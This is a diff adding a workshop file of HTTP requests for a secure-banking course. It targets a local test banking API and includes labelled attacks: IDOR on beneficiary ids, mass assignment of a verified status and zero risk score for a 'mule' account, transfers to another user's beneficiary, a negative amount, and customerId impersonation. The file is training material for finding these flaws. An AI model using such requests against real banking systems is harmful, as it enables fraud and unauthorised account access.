@@ -1,0 +1,69 @@
+### Taller Banca Segura IA — requests de exploración (IntelliJ HTTP Client / VS Code REST Client)
+### Usuarios de PRUEBA: ana / ana123  ·  bruno / bruno123
+
+@base = http://localhost:8080
+
+### 1. Listar mis beneficiarios (ana)
+GET {{base}}/api/beneficiaries
+Authorization: Basic ana ana123
+
+### 2. Ver uno de mis beneficiarios por id (ana -> 90)
+GET {{base}}/api/beneficiaries/90
+Authorization: Basic ana ana123
+
+### 3. ATAQUE IDOR: 90 -> 91 (beneficiario de bruno)
+GET {{base}}/api/beneficiaries/91
+Authorization: Basic ana ana123
+
+### 4. ATAQUE Mass Assignment (CWE-915): me asigno estado VERIFIED y riesgo 0
+POST {{base}}/api/beneficiaries
+Authorization: Basic ana ana123
+Content-Type: application/json
+
+{
+  "alias": "Cuenta mula",
+  "holderName": "Tercero",
+  "holderRut": "77777777-7",
+  "bankCode": "016",
+  "accountNumber": "000999888777",
+  "status": "VERIFIED",
+  "internalRiskScore": 0
+}
+
+### 5. ATAQUE Tampering: transfiero a un beneficiario de bruno (UUID "imposible de adivinar")
+POST {{base}}/api/transfers
+Authorization: Basic ana ana123
+Content-Type: application/json
+
+{
+  "beneficiaryId": "7b2e9d14-6a3c-4f8e-b1d5-2c9a8e4f9102",
+  "amount": 10000,
+  "currency": "CLP"
+}
+
+### 6. ATAQUE monto negativo
+POST {{base}}/api/transfers
+Authorization: Basic ana ana123
+Content-Type: application/json
+
+{
+  "beneficiaryId": "3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001",
+  "amount": -50000,
+  "currency": "CLP"
+}
+
+### 7. ATAQUE suplantación por parámetro: customerId de bruno
+POST {{base}}/api/transfers
+Authorization: Basic ana ana123
+Content-Type: application/json
+
+{
+  "customerId": 2,
+  "beneficiaryId": "3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001",
+  "amount": 1000,
+  "currency": "CLP"
+}
+
+### 8. Error verboso: id inexistente / JSON roto
+GET {{base}}/api/beneficiaries/9999
+Authorization: Basic ana ana123
